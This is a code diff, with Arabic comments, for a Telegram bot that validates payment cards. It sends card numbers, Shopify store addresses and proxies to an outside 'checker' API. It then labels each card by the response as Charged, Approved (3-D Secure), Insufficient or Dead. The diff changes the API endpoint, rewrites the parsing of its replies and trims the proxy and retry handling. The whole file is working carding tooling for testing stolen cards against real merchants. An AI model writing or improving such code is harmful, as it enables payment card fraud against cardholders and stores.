@@ -84,8 +84,8 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# تركيب رابط الـ API الجديد كلياً والمرفوع على منصة Railway لإنهاء التعليق والتقطيع
-SHOPIFY_API_URL_1 = 'https://web-production-7c318.up.railway.app/sh'
+# [تحديث] رابط الـ API الجديد الفريش والمطلوب حصرياً
+SHOPIFY_API_URL_1 = 'https://autosh.up.railway.app//shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
@@ -174,6 +174,7 @@ CE_SHY = '<tg-emoji emoji-id="6201647288947839133">🤭</tg-emoji>'
 CE_CHECK = '<tg-emoji emoji-id="5445189224682779974"><b>✔️</b></tg-emoji>'
 CE_DOWN = '<tg-emoji emoji-id="5445358884480916784">🔽</tg-emoji>'
 CE_CARD = '<tg-emoji emoji-id="5447453226498552490">💳</tg-emoji>'
+CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji>'
 CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji>'
 CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'
 
@@ -549,93 +550,82 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# تنظيف البروكسيات وبناء المعاملات بما يتوافق مع الـ API بالهيكلية الصارمة المطلوبة لتفادي البطء كلياً
+# [تعديل جذري] دالة جلب رد الـ API الصافي بدون أي زيادات وتمرير الموقع المستورد فوراً
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
-        # [استعادة الوضع الأصلي تماماً]: قص بروتوكول البروكسي كلياً ليعمل وفقاً لمدخلات الـ API الخاص بك بدون أخطاء
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         if proxy_str and "://" in proxy_str:
             proxy_str = proxy_str.split("://")[-1]
         
         card_encoded = quote(str(card).strip())
         
-        # [استعادة الوضع الأصلي تماماً]: إضافة بروتوكول https:// للموقع ليقبله خادم الفحص دون التسبب بـ step 1 failed
+        # أخذ الدومين القادم من ملف المواقع وتمريره كلياً للـ API
         site_param = site.strip()
         if not site_param.startswith("http"):
             site_param = f"https://{site_param}"
         site_encoded = quote(site_param)
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
-        
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
         
-        async with session.get(req_url, headers=headers, timeout=12) as resp:
-            if resp.status == 429:
-                return {'status': 'Rate Limit', 'message': 'API Rate Limited (429)', 'card': card, 'retry': True}
-            if resp.status in [502, 503, 504]:
-                return {'status': 'Site Error', 'message': f'Server Overloaded ({resp.status})', 'card': card, 'retry': True}
-            if resp.status != 200: 
-                return {'status': 'Site Error', 'message': f'API HTTP Status {resp.status}', 'card': card, 'retry': True}
-                
+        async with session.get(req_url, headers=headers, timeout=15) as resp:
             text_data = await resp.text()
+            
+            # محاولة قراءة الرد كـ JSON، وإذا لم يكن كذلك، نأخذ النص الخام بالكامل
             try: 
                 rj = json.loads(text_data)
+                rm = ""
+                # البحث عن رد الـ API في أي حقل مسترجع لإظهاره كما هو
+                for key in ['response_msg', 'result', 'Response', 'message', 'error', 'msg', 'status']:
+                    if key in rj and rj[key] is not None:
+                        rm = str(rj[key]).strip()
+                        break
+                if not rm:
+                    rm = text_data.strip()
             except Exception: 
-                tl = text_data.lower()
-                if "charged" in tl or "success" in tl or "payment succeeded" in tl:
-                    return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
-                if "insufficient" in tl:
-                    return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
-                if "3d" in tl or "secure" in tl or "otp" in tl:
-                    return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
-                return {'status': 'Site Error', 'message': 'Invalid API JSON Response', 'card': card, 'retry': True}
+                rm = text_data.strip()
             
-        # [التحديث الحرج]: إعطاء الأولوية لمفتاح response_msg المسترجع من الـ API الخاص بك لمعرفة النتيجة الفعلية
-        rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
-        pr = rj.get('Price', rj.get('amount', "$10.00")) 
-        gt = rj.get('Gateway', 'Shopify')
-        rl = rm.lower()
-        
-        status_val = rj.get('status')
-        status_is_false = False
-        if isinstance(status_val, bool) and not status_val:
-            status_is_false = True
-        elif isinstance(status_val, str) and status_val.lower() in ['false', 'fail', 'error', 'failed']:
-            status_is_false = True
+            rl = rm.lower()
             
-        if status_is_false:
-            if any(k in rl for k in ['decline', 'insufficient', 'funds', 'balance', '3d', 'secure', 'otp', 'cvv', 'cvc', 'match', 'approved', 'expired', 'pickup', 'stolen', 'fraud']):
-                pass
-            else:
-                return {'status': 'Site Error', 'message': rm or 'API returned fail status', 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-        
-        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'connection', 'tunnel', 'cloudflare']):
-            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
-            return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
-        if 'charged' in rl or 'completed' in rl or 'payment succeeded' in rl or 'success' in rl: 
-            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
-        if '3d' in rl or 'secure' in rl or 'otp' in rl:
-            return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match', 'cvv_mismatch', 'incorrect_cvc']): 
-            return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+            # تصنيف الحالة بناءً على نص الرسالة الصافية المسترجعة
+            if any(k in rl for k in ['charged', 'completed', 'payment succeeded', 'success', 'succeeded']):
+                return {'status': 'Charged', 'message': rm, 'card': card}
+            if any(k in rl for k in ['insufficient', 'funds', 'balance', 'insufficient_funds']):
+                return {'status': 'Insufficient', 'message': rm, 'card': card}
+            if any(k in rl for k in ['3d', 'secure', 'otp', 'verification', 'challenge']):
+                return {'status': 'Approved', 'message': rm, 'card': card}
+            if any(k in rl for k in ['approved', 'invalid_cvv', 'match', 'cvv_mismatch', 'incorrect_cvc']): 
+                return {'status': 'Approved', 'message': rm, 'card': card}
+            if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
+                return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True}
+                
+            return {'status': 'Dead', 'message': rm, 'card': card}
         
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
     except Exception as e: 
-        return {'status': 'Site Error', 'message': f'API Error: {str(e)[:40]}', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}
 
-# تصفية وحذف تلقائي للبروكسيات الميتة منعاً لتجميد خيوط الفحص وثبات معدل CPM
+async def remove_proxy_by_url(uid, proxy_url):
+    try:
+        current_proxies = await get_all_user_proxies(uid)
+        if current_proxies:
+            for idx, p in enumerate(current_proxies):
+                if p.get('proxy_url') == proxy_url:
+                    await remove_proxy_by_index(uid, idx)
+                    break
+    except Exception: pass
+
+# دالة تمرير النتيجة الصافية القادمة من الـ API إلى البوت فورا بدون تعديل
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
     lr = None
     for attempt in range(max_retries):
         if not proxies: 
-            p_dict = p = None
+            p = None
         else:
             p_dict = random.choice(proxies)
             p = p_dict['proxy_url']
@@ -650,36 +640,16 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         if gateway_name == "Shopify":
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
             status = r.get('status')
-            msg = str(r.get('message', '')).lower()
             
-            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
-                if p_dict:
-                    if p_dict in proxies:
-                        proxies.remove(p_dict)
-                    asyncio.create_task(remove_proxy_by_url(uid, p_dict['proxy_url']))
+            if status == 'Site Error' or r.get('retry'):
                 lr = r
                 continue
-
-            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
-                await asyncio.sleep(random.uniform(1.0, 1.8))
-                lr = r
-                continue
-
-            if status == 'Site Error' or is_dead_site_error(msg):
-                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
-                lr = r
-                continue
+            return r
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
         
-        if not r.get('retry'):
-            if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
-                _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
-            return r
-        lr = r
-        
-    if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
-    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
+    if lr: return lr
+    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
